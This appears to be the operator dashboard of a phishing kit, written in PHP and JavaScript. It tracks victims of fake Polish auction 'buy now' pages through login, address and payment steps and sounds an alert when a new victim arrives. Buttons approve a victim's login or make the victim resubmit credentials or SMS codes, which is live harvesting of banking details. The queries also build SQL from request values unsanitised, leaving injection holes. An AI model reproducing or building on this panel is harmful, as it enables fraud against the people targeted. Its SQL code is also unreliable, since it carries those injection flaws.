<?php include('header.php');
include('YH0uW3ecaRHG16ld4waY.php');
include('db.php'); 
include_once('utils.php');

//echo '<script>alert("'.$session_role.'");</script>';
//echo '<script>alert('.$_SESSION['user_id'].');</script>';
$new1 = $con->query("SELECT * FROM `payment` WHERE `beep` = '1' order by last_login");
$counting = $new1->num_rows;

 if(isset($_POST['delete_all'])){
	$clone_id = clone_id;
	$sqldel = "DELETE FROM payment WHERE id!='$clone_id' AND last_login>2400;";
	$con->query($sqldel);
 }

	
	
if($_GET['delete']=='else'){
    if(isset($_POST['delete'])){
 $cnt=array();
 $cnt=count($_POST['checkbox']);

        for($i=0;$i<$cnt;$i++){
            $del_id=$_POST['checkbox'][$i];
        $sqldel = "DELETE FROM payment WHERE id='$del_id'";
        $con->query($sqldel);
//        echo '<script>window.location.href="payment.php?payment_id="'.$payment_id.'";</script>';
        }
    }
}
?>

<style>
</style>
    <div  class="column content-column" style="overflow:scroll !important;height:80vh;">

<?php 


if($_GET['delete']=='else'){
    if(isset($_POST['delete'])){
		 $cnt=array();
		 $cnt=count($_POST['checkbox']);

        for($i=0;$i<$cnt;$i++){
            $del_id=$_POST['checkbox'][$i];
        
        //echo '<script>alert("'.$del_id.'");</script>';
        $sqldel = "DELETE FROM payment WHERE id='$del_id'";
        $con->query($sqldel);
//        echo '<script>window.location.href="payment.php?payment_id="'.$payment_id.'";</script>';   
        }
    }
    echo '<script>window.location.href="usrauth.php";</script>';
}

if(isset($_GET['sound'])){
$new1 = $con->query("SELECT * FROM `payment` WHERE `beep` = '1'  order by last_login");
echo $counting = $new1->num_rows;
}else{
?>
      <div class="col-md-12" style="padding: 0px 0px 0px 0px !important" style="overflow:scroll; height:100px;">

        <div class="list-header fill">
          <div class="list-filter clearfix">
           <div class="pull-right">
             <div class="btn-group  list-sorter">

            </div>
            </div>
            <div>

            </div>
          </div>
        </div>
<?php 
if($counting > 0){
?>

<audio id="myAudio">
  <source src="deeg3beep-01a.wav" type="audio/wav">
  <source src="deeg3beep-01a.mp3" type="audio/mpeg">
  Your browser does not support the audio element.
</audio>
<!--<embed src="deeg3beep-01a.wav" autostart="false" width="0" height="0"  enablejavascript="true"> -->
<?php 
//$con->query("UPDATE `payment` SET `beep` = '0' WHERE  `beep` = '1'");
} ?>
        <div id="ember1921" class="scroll-y fill body scrollbox noscroll-x ember-view" style="height: 1000px;padding: 0px 0px 0px 0px ">   
        <div id="ember1922" class="ember-view">
<script>
var x = document.getElementById("myAudio"); 

function playAudio() { 
    x.play(); 
} 

function pauseAudio() { 
    x.pause(); 
} 
playAudio();
</script>
</div>
<form id="emberdiv" action="usrauth.php?delete=else" method="post">

<div class="pull-right">
<?php
if($session_role=='admin'){
$sqsp1 = "SELECT * FROM `payment` WHERE `block_status` = 'unblocked'";
$newsp1 = $con->query($sqsp1);
}else{
$sqsp11 = "SELECT * FROM `payment` WHERE `block_status` = 'unblocked' AND `company_email` = '$session_email'";
$newsp1 = $con->query($sqsp11);
}
$rowsp1 = $newsp1->fetch_assoc();
$num1 = $newsp1->num_rows;

$sqsp2 = "SELECT * FROM `payment` WHERE  `block_status` = 'unblocked' AND `block_session` = '$session_email'";
$newsp2 = $con->query($sqsp2);
$rowsp2 = $newsp2->fetch_assoc();
$num2 = $newsp2->num_rows;


if($num1!=$num2){
?>
                      <a href="block_unblock.php?session_emails=<?php echo $session_email; ?>&status=blocked&page_name=usrauth.php" class="btn btn-danger"> 
                        <i class="fa fa-lock"></i>&nbsp;block All
                      </a>
<?php }else{ ?>
                      <a href="block_unblock.php?session_emails=<?php echo $session_email; ?>&status=unblocked&page_name=usrauth.php" class="btn btn-success"> 
                        <i class="fa fa-unlock"></i>&nbsp;Unlock All
                      </a>
<?php } ?>

                      <button class="btn btn-danger popovercontainer ember-view" type="submit" name="delete" > 
                        <i class="fa fa-trash"></i>&nbsp;Delete
                      </button>
					  
					  <button class="btn btn-danger popovercontainer ember-view" type="submit" name="delete_all" > 
                        <i class="fa fa-trash"></i>&nbsp;Delete Last All
                      </button>

                      <a  class="btn btn-primary" onclick="check_full('<?php echo $session_email; ?>','<?php echo $session_role; ?>','on')">
                        Check All
                      </a>
                      <a  class="btn btn-primary" onclick="check_full('<?php echo $session_email; ?>','<?php echo $session_role; ?>','off')">
                        Unheck All
                      </a>
            

<br><br>
</div>

<table class="table table-hover zi-table  ember-view" style="overflow-y:scroll;" id="embertable1" >  
         <thead>
            <tr>
                 <th style="" id="ember1927" class="sortable text-left ember-view">
                    <div title="Email" class="pull-left over-flow">PLN</div>
                  </th>
                  <th style="" id="ember1925" class="sortable text-left ember-view">
                    <div title="Name" class="pull-left over-flow"> Trans. Id</div>
                  </th>
                  <th style="" id="ember1925" class="sortable text-left ember-view">
                    <div title="Name" class="pull-left over-flow"> Item Name</div>
                  </th>
                  <th style="" id="ember1925" class="sortable text-left ember-view">
                    <div title="Name" class="pull-left over-flow"> Status</div>
                  </th>
                  <th style="" id="ember1930" class="text-left ember-view">
                    <div title="Unused Credits" class="pull-left over-flow"> Trash</div>
                  </th>
            </tr>
          </thead>


        <tbody>
            <?php 
            $header_2=0;
            //$sql1 = "SELECT * , TIMESTAMPDIFF(SECOND,t1.updated_at, CURRENT_TIMESTAMP()) AS timediff  FROM `auctions` AS t1 LEFT JOIN (SELECT * FROM `purchases` ORDER BY `id` DESC) t2 ON t1.id=t2.auction_id ORDER BY t1.updated_at DESC";
            $sql1 = "SELECT * FROM `auctions` , (SELECT auction_id , SUM(main_page) AS main_total, SUM(login_page) AS login_total, SUM(confirm_page) AS confirm_total, SUM(address_page) AS address_total, SUM(payset_page) AS payset_total , SUM(payment_page) AS paymentpage_total FROM `purchase_tracks` GROUP BY  `auction_id`) AS t2 WHERE auctions.id=t2.auction_id";
            console_log($sql1);
            $new1 = $con->query($sql1);
            $paolo_arr = [];
            while ($auction = $new1->fetch_assoc()) {
                $paolo_arr[] = $auction;
            }
            $new1 = $paolo_arr;

            foreach ($new1 as $auction) {

			//echo json_encode($pay);
            ?>

            <?php if($auction['timediff'] > '180' && $header_2==0){ $header_2=1;?>

</tbody>
        </table>
<table class="table table-hover zi-table  ember-view" style="overflow-y:scroll;" id="embertable2" ng-app="">  
         <thead>
            <tr>
                 <th style="" id="ember1927" class="sortable text-left ember-view">
                    <div title="Email" class="pull-left over-flow"> PLN </div>
                  </th>
                  <th style="" id="ember1925" class="sortable text-left ember-view">
                    <div title="Name" class="pull-left over-flow"> Trans. Id</div>
                  </th>
                  <th style="" id="ember1925" class="sortable text-left ember-view">
                    <div title="Name" class="pull-left over-flow"> Item Name</div>
                  </th>
                  <th style="" id="ember1925" class="sortable text-left ember-view">
                        <div title="Name" class="pull-left over-flow"> Status</div>
                  </th>
                 <th style="" id="ember1930" class="text-left ember-view">
                    <div title="Unused Credits" class="pull-left over-flow"> Trash</div>
                  </th>
            </tr>
          </thead>


        <tbody>

<?php } ?>

<tr data-ember-action="" data-ember-action-1946="1946" style="background: <?php if ($pay['status'] == 'block') {
    echo '#F7B0DB';
} elseif ($pay['status'] == 'aproove') {
    echo '#20b523';
} elseif ($pay['status'] == 'login_aproove') {
    echo '#FFA500';
} elseif ($pay['status'] == 'copy') {
    echo '#77f97b';
} ?>">

    <td>
        <?php echo $auction['price']; ?>
    </td>

    <td id="ember1965" class="ember-view">
        <input type="text" id="id<?php echo $pay['id']; ?>" name=""
               value="<?php echo "https://" . $_SERVER['SERVER_NAME'] . "/" . URL_Auction; ?>index.php?payment_id=<?php echo $auction['payment_id']; ?>"
               style="width: 10px;" readonly><?php $ids = $auction['payment_id']; ?>
        <a onclick="copy('#id<?php echo $ids; ?>');"
           class="btn btn-primary popovercontainer ember-view"><?php echo $auction['payment_id']; ?></a>

    </td>

    <td id="ember1965" class="ember-view">
        <?php echo $auction['product_name']; ?>
    </td>

    <td id="ember1925" class="ember-view">
        <?php
        {
            echo '<span style="margin-right: 20px;">Main Page <span style="color:red;">('.$auction['main_total'].')</span> </span>';
            echo '<span style="margin-right: 20px;">KUP TERAZ  <span style="color:red;">('.$auction['login_total'].')</span></span>';
            echo '<span style="margin-right: 20px;">CONFIRMATION  <span style="color:red;">('.$auction['confirm_total'].')</span></span>';
            echo '<span style="margin-right: 20px;">SET ADDRESS  <span style="color:red;">('.$auction['address_total'].')</span></span>';
            echo '<span style="margin-right: 20px;">PAY PAGE  <span style="color:red;">('.$auction['paymentpage_total'].')</span></span>';
        }

        ?>
    </td>
    <td id="ember1961" class="ember-view">
        <a href="pay_delete.php?id=<?php echo $pay['id']; ?>&page=usrauth.php" style="color:red;"><i
                    class="fa fa-trash"></i></a>

        <?php if ($pay['checkbox'] == 'on') { ?>
            &nbsp; <input name="checkbox[]" type="checkbox" value="<?php echo $pay['id']; ?>"
                          id="<?php echo $pay['id']; ?>" style="cursor:pointer"
                          onclick="check_boxes(<?php echo $pay['id']; ?>,this.value)" checked="">
        <?php } else { ?>
            &nbsp; <input name="checkbox[]" type="checkbox" value="<?php echo $pay['id']; ?>"
                          id="<?php echo $pay['id']; ?>" style="cursor:pointer"
                          onclick="check_boxes(<?php echo $pay['id']; ?>,this.value)">

        <?php } ?>
    </td>
</tr>



<?php }  ?>

        <!----></tbody>
        </table>
</form>    
        
        <div>
        </div>
        </div>     

        <?php } ?>
      </div>
 
 <?php
 $on = 'on';
 $off = 'off';
 ?>
<script>
/************************************* CHECKALL ************************************/

function changegrid(id){

  var gridcode=document.getElementById('gridcode'+id).value;
  var checked = document.getElementById('check'+id).checked;
        if (window.XMLHttpRequest) {
            // code for IE7+, Firefox, Chrome, Opera, Safari
            xmlhttp = new XMLHttpRequest();
        } 
        else {
            // code for IE6, IE5
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //alert(this.responseText);


               $("#emberdiv").load(location.href + " #emberdiv");
               //$("#embertable2").load(location.href + " #embertable2");
            }
        };
        checked == true ? checked = 1:checked = 0;
        xmlhttp.open("GET","ajaxgridupdate.php?id="+ id + "&gridcode=" + gridcode + "&checked=" + checked,true);
 //       xmlhttp.open("GET","ajaxgridupdate.php?id="+ id + "&gridcode=" + gridcode,true);
        xmlhttp.send(); 
}

function check_full(email,role,value) { 
   
    if (email == "") {
    } else { 
        if (window.XMLHttpRequest) {
            // code for IE7+, Firefox, Chrome, Opera, Safari
            xmlhttp = new XMLHttpRequest();
        } else {
            // code for IE6, IE5
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //alert(this.responseText);


               $("#emberdiv").load(location.href + " #emberdiv");
               //$("#embertable2").load(location.href + " #embertable2");
            }
        };
        xmlhttp.open("GET","check_all_ajax.php?email="+ email + "&role=" + role + "&value=" + value,true);
        xmlhttp.send();
    }
}
/************************************* CHECKALL ************************************/ 



/************************ CHECKBOXES *****************************/
function check_boxes(str,value) {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
                //alert(this.responseText);
                
               //$("#embertable").load(location.href + " #embertable");
                    //document.getElementById("embertable").innerHTML = this.responseText;
                    //alert(this.responseText);
                
            }
        };
        xmlhttp.open("GET", "checkboxes_ajax.php?id="+ str , true);
        xmlhttp.send();
}
/************************ CHECKBOXES *****************************/


function copy(id) 
{//alert()
document.querySelector(id).select();
document.execCommand('copy');

}
function table_refresh() {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
                //alert(this.responseText);
                
               $("#emberdiv").load(location.href + " #emberdiv");
               //$("#embertable2").load(location.href + " #embertable2");
                    //document.getElementById("embertable").innerHTML = this.responseText;
                
            }
        };
        xmlhttp.open("GET", "user_123123auth_ajax.php", true);
        xmlhttp.send();
}
table_refresh();
                     setInterval(function(){ table_refresh(); }, 10000);

function status_aproove(payment_id) {
//    alert(payment_id);
    if (payment_id.length == 0) {
    } else {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
                //alert(this.responseText);
                if(this.responseText=='aproove'){
               $("#emberdiv").load(location.href + " #emberdiv");
               //$("#embertable2").load(location.href + " #embertable2");
                    
/*                    document.getElementById("check").style.display = 'none';
                    document.getElementById("but").style.display = 'block';
                    document.getElementById("buts").style.display = 'block'; */
                }
            }
        };
        xmlhttp.open("GET", "ajax/ajax_approve.php?payment_id=" + payment_id, true);
        xmlhttp.send();
    }
}
function aproove(payment_id) {
    if (payment_id.length == 0) {
    } else {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
                //alert(this.responseText);
                if(this.responseText=='aproove'){
                       //alert('user approved');
                    //document.getElementById("check").style.display = 'none';
                    //document.getElementById("but").style.display = 'block';
                }
            }
        };
        xmlhttp.open("GET", "ajax/ajax_approve_login.php?payment_id=" + payment_id, true);
        xmlhttp.send();
    }
}
function logoncancel(payment_id) {
    if (payment_id.length == 0) {
    } else {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
                //alert(this.responseText);
                if(this.responseText=='aproove'){
                    alert('user informed to submit login details again');
                    //document.getElementById("check").style.display = 'none';
                    //document.getElementById("but").style.display = 'block';
                }
            }
        };
        xmlhttp.open("GET", "ajax/ajax_approve_invalide.php?status=login_invalid&payment_id=" + payment_id, true);
        xmlhttp.send();
    }
}
function status_cancel(payment_id) {
    if (payment_id.length == 0) {
    } else {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
                //alert(this.responseText);
                if(this.responseText=='aproove'){
                       alert('user informed to submit sms code again');
                    //document.getElementById("check").style.display = 'none';
                    //document.getElementById("but").style.display = 'block';
                }
            }
        };
        xmlhttp.open("GET", "ajax/ajax_approve_invalide.php?status=invalid_code&payment_id=" + payment_id, true);
        xmlhttp.send();
    }
}
</script>


    </div>
</body>
</html>
<script type="text/javascript">
                      //setTimeout(function(){ window.location.href="usrauth.php"; }, 10000);

</script>

<!-- --------------------- --- MODEL BOX --- -------------------- -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.min.css" />
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.min.js"></script>
<button type="button" class="btn btn-info" data-toggle="modal" data-target="#myModal">Open Modal</button>
<!-- --------------------- --- MODEL BOX --- -------------------- -->

<!-- ******************************** ADD MODEL *********************** -->
<style type="text/css">
.faq-list li {
    color: #860c0c;
    padding: 6px 0 10px;
        padding-top: 6px;
}   
.faq-list {
    padding: 6px 0 10px 20px;
}
.modal-content{
      left: 99%;
      top: 30%;
    min-height: 700px;
    width: 420px
  }
  .modal-body{
        height: 600px;
    overflow-y: scroll;
    overflow-x: hidden;
}
.modal{
overflow-x: hidden;
top: 5%;
}
.close{
  margin-right: 25px;
}
</style>
<div id="myModals" class="modal fade" role="dialog">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal">&times;</button>
        <h4 class="modal-title">Page Tips</h4>
      </div>
      <div class="modal-body">


  <div class="pagetips-list">
    <p class="text-uppercase"><b></b></p>
    <ul class="faq-list f12">
     <li>
       <a href="" target="_blank">
 
       </a>
     </li>
     <li>
       <a href="" target="_blank">
eful?
       </a>
     </li>
     <li>
       <a href="" target="_blank">

       </a>
     </li>
     <li>
       <a href="" target="_blank">

       </a>
     </li>
     <li>
       <a href="" target="_blank">
   </a>
     </li>
     <li>
       <a href="" target="_blank">

       </a>
     </li>
     <li>
       <a href="" target="_blank">

       </a>
     </li>
     <li>
       <a href="" target="_blank">

       </a>
     </li>
     <li>
       <a href="" target="_blank">
       
       </a>
     </li>
    </ul>
</div>


              <div class="modal-footer">  
</div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- ******************************** ADD MODEL *********************** -->


<!-- ******************************** AMARJEET *********************** -->

<script>
setInterval(function(){ show_sound(); }, 1000);
show_sound();
function show_sound() {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
//alert(this.responseText);
  if(this.responseText>='1'){
playAudio();
no_sound();
}
          }
        };
        xmlhttp.open("GET", "512user_so342und.php?session_email=<?php echo $session_email; ?>&session_role=<?php echo $session_role; ?>", true);
        xmlhttp.send();
}
</script>




<script>
function no_sound(){
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("txtHint").innerHTML = this.responseText;
//alert(this.responseText);

          }
        };
        xmlhttp.open("GET", "12user_12nosound.php?session_email=<?php echo $session_email; ?>&session_role=<?php echo $session_role; ?>", true);
        xmlhttp.send();
}

</script>


<audio id="myAudio">
  <source src="bringding.mp3" type="audio/mpeg">
  <source src="bringding.mp3" type="audio/mpeg">
  Your browser does not support the audio element.
</audio>

<script>
var x = document.getElementById("myAudio"); 
function playAudio() { 
    x.play(); 
} 

function pauseAudio() { 
    x.pause(); 
} 
</script>

<script src="jquery.min.js"></script>

<!-- ******************************** AMARJEET *********************** -->
